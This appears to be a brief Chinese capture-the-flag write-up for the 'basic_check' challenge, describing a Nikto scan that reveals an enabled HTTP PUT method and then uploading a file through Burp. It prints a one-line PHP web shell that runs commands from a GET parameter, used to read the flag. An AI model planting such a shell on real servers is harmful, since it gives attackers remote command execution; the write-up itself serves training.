# [NSSRound#1 Basic]basic_check

----

1.

![image-20240602121820799](https://gitee.com/bx33661/image/raw/master/path/image-20240602121820799.png)

发现没有什么东西，bp抓包没有发现：

![image-20240602121956923](https://gitee.com/bx33661/image/raw/master/path/image-20240602121956923.png)

利用Nikto：

![image-20240602122602137](https://gitee.com/bx33661/image/raw/master/path/image-20240602122602137.png)

发现put方法

2.

利用bp传put方法,==创造一个/bx.php==：

`<?system($_GET["cmd"])?>`

传入成功后利用get方法在`****/bx.php`这里获取flag

=="cat /flag"==